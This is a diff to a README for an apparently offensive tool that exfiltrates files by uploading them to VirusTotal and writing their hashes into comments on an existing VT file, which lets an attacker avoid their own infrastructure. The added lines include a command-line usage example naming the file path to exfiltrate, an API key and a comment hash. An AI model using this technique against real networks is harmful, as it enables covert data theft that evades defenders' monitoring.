@@ -7,7 +7,12 @@ As defenders we are often overwhelmed by the sheer amount of network traffic in 
 My main goal was to use virustotal upload and download functionalities to transfer files back and forth without the need to use our own infrastructure, and breaking the diamond model from the defenders perspective. 
 
 ## Quick usage
-The tool is pretty simple just provide it a path when promted (or using -f), your VT API key, and a hash of a file (already uploded to VT) to which you want the hashes of the files exfiltrated to be written, to be able to download then later on.    
+The tool is pretty simple just provide it a path, your VT API key, and a hash of a file (already uploded to VT) to which you want the hashes of the files exfiltrated to be written, to be able to download then later on.    
+
+```
+python .\Vt-Not-So-Pretty.py -f "PATH_TO_EXFIL" -k YOUR_API_KEY -c HASH_TO_COMMENT_ON
+```
+Alternatively you can enter this when prompted:
 
 ![Vy-Not-So-Pretty](https://github.com/user-attachments/assets/780fec17-50da-4aef-a91e-d3682be5c573)
 
